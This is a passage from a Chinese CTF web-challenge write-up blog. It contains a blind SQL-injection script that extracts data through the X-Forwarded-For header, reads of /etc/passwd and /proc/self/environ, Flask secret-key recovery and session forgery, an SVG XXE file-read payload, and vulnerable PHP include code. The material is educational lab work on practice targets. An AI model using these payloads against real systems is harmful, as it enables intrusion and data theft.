F4l9_D4t4B45e.F4l9_t4b1e),&#123;&#125;,1))>&#123;&#125;) or '0"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                    <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3'</span><span class="token punctuation">,</span>                    <span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span> payload                    <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">)</span>        payload <span class="token operator">=</span> <span class="token string">'111'</span>        headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                    <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3'</span><span class="token punctuation">,</span>                    <span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span> payload                    <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">)</span>        payload <span class="token operator">=</span> <span class="token string">'111'</span>        headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                    <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3'</span><span class="token punctuation">,</span>                    <span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span> payload                    <span class="token punctuation">&#125;</span>         r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">)</span>        <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">429</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'too fast'</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'Last Ip: 1'</span>  <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">elif</span> <span class="token string">'Last Ip: 1'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            right <span class="token operator">=</span> mid         mid <span class="token operator">=</span> left <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>right<span class="token operator">-</span>left<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> mid <span class="token operator">==</span> <span class="token number">31</span> <span class="token keyword">or</span> mid <span class="token operator">==</span> <span class="token number">127</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    res <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#information_schema,ctftraining,mysql,performance_schema,test,ctf,F4l9_D4t4B45e</span><span class="token comment">#F4l9_t4b1e</span><span class="token comment">#F4l9_C01uMn</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="HarekazeCTF2019-Avatar-Uploader-1"   >          <a href="#HarekazeCTF2019-Avatar-Uploader-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h2>      <p>传图片马不通过估计是因为<code>getimagesize</code>没有拿到大小信息，自己搞一个就行，上传发现啥也没得，就换了个头像，看源码咯</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'lib/util.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'lib/session.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$session</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SecureClientSession</span><span class="token punctuation">(</span><span class="token constant">CLIENT_SESSION_ID</span><span class="token punctuation">,</span> <span class="token constant">SECRET_KEY</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// check whether file is uploaded</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No file was uploaded.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// check file size</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">256000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Uploaded file is too large.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// check file type</span><span class="token variable">$finfo</span> <span class="token operator">=</span> <span class="token function">finfo_open</span><span class="token punctuation">(</span><span class="token constant">FILEINFO_MIME_TYPE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$type</span> <span class="token operator">=</span> <span class="token function">finfo_file</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">finfo_close</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Uploaded file is not PNG format.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// check file width/height</span><span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">256</span> <span class="token operator">||</span> <span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Uploaded image is too large.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token constant">IMAGETYPE_PNG</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// I hope this never happens...</span>  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'What happened...? OK, the flag for part 1 is: &lt;code>'</span> <span class="token operator">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FLAG1'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/code>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// ok</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.png'</span><span class="token punctuation">;</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">UPLOAD_DIR</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$session</span><span class="token operator">-></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'avatar'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">flash</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'info'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Your avatar has been successfully updated!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到<code>if ($size[2] !== IMAGETYPE_PNG)</code>成立的话就会输出flag</p><p>getimagesize返回结果说明</p><ul><li>索引 0 给出的是图像宽度的像素值</li><li>索引 1 给出的是图像高度的像素值</li><li>索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM</li><li>索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签</li><li>索引 bits 给出的是图像的每种颜色的位数，二进制格式</li><li>索引 channels 给出的是图像的通道值，RGB 图像默认是 3</li><li>索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header(“Content-type: image/jpeg”);</li></ul><p>所以我们现在需要的条件是：</p><p>1、文件经过<code>finfo_file</code>方法检测到的是PNG图片</p><p>2、getimagesize函数返回图片信息，第三个元素不能等于IMAGETYPE_PNG，也就是不能为3</p><p><code>finfo_file</code>方法是通过检测文件头的十六进制信息来判断文件类型的，那么我们一点点删除直到<code>finfo_file</code>能读出类型而<code>getimagesize</code>读不出内容即可</p>        <h2 id="CISCN2019-华东南赛区-Web4"   >          <a href="#CISCN2019-华东南赛区-Web4" class="heading-link"><i class="fas fa-link"></i></a><a href="#CISCN2019-华东南赛区-Web4" class="headerlink" title="[CISCN2019 华东南赛区]Web4"></a>[CISCN2019 华东南赛区]Web4</h2>      <p>Read Something，传参读文件试试<code>/etc/passwd</code>读到了，那再读读环境文件吧<code>/proc/self/environ</code>，看到python文件位置，读源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># encoding:utf-8</span><span class="token keyword">import</span> re<span class="token punctuation">,</span> random<span class="token punctuation">,</span> uuid<span class="token punctuation">,</span> urllib<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> requestapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">233</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'www-data'</span>    <span class="token keyword">return</span> <span class="token string">'Hello World! &lt;a href="/read?url=https://baidu.com">Read somethings&lt;/a>'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/read'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span>        m <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'^file.*'</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> re<span class="token punctuation">.</span>IGNORECASE<span class="token punctuation">)</span>        n <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> re<span class="token punctuation">.</span>IGNORECASE<span class="token punctuation">)</span>        <span class="token keyword">if</span> m <span class="token keyword">or</span> n<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'No Hack'</span>        res <span class="token operator">=</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> ex<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ex<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'no response'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'fuck'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Access denied'</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>        debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>        host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span>    <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到如果想拿到flag，就要在session处构造username为fuck，再看<code>SECRET_KEY</code>处</p><p><code>random.seed(uuid.getnode())</code>这里的getnode用于获取网络接口的mac地址，如果机器有多个mac地址，则返回通用管理的mac地址</p><p><code>str(random.random()*233)</code>此处的随机数由于之前播撒了种子，所以生成的是伪随机数</p><p>所以要先读一下环境的网卡地址<code>/sys/class/net/eth0/address</code>，然后用脚本得到SECRET_KEY</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">0xae3fa6c532bd</span><span class="token punctuation">)</span>randStr <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">233</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>randStr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>伪造session</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205281141102.png"></p><p>上传发现不行，寄了以后再来填坑</p>        <h2 id="BSidesCF-2019-SVGMagic"   >          <a href="#BSidesCF-2019-SVGMagic" class="heading-link"><i class="fas fa-link"></i></a><a href="#BSidesCF-2019-SVGMagic" class="headerlink" title="[BSidesCF 2019]SVGMagic"></a>[BSidesCF 2019]SVGMagic</h2>      <p>冷知识：SVG格式是由xml语法定义的</p><p>关于SVG上传造成的漏洞可以看<span class="exturl"><a class="exturl__link"   href="https://zhuanlan.zhihu.com/p/323315064" >这里</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>所以自然联想到XXE漏洞</p><p>构造payload</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY file SYSTEM "file:///proc/self/pwd/flag.txt"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1000<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span> <span class="token attr-name">x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token attr-name">y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传拿flag<del>环境似乎有问题，不管怎么传都会报错</del></p>        <h2 id="N1CTF-2018-eating-cms"   >          <a href="#N1CTF-2018-eating-cms" class="heading-link"><i class="fas fa-link"></i></a><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2>      <p>扫出注册界面，注册登录，发现参数传递，尝试使用伪协议读取文件成功</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//user.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"function.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$oper_you_can_do</span> <span class="token operator">=</span> <span class="token variable">$OPERATE_admin</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$oper_you_can_do</span> <span class="token operator">=</span> <span class="token variable">$OPERATE</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//die($_SESSION['isadmin']);</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span><span class="token comment">//            echo("&lt;script>alert('no premission to visit info, only admin can, you are guest')&lt;/script>");</span>            <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: user.php?page=guest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//if(!in_array($page,$oper_you_can_do))&#123;</span><span class="token comment">//    $page = 'info';</span><span class="token comment">//&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$page</span></span>.php"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">//function.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: hacker.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"manage"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ffffllllaaaaggg"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($query);</span><span class="token comment">//    die();</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        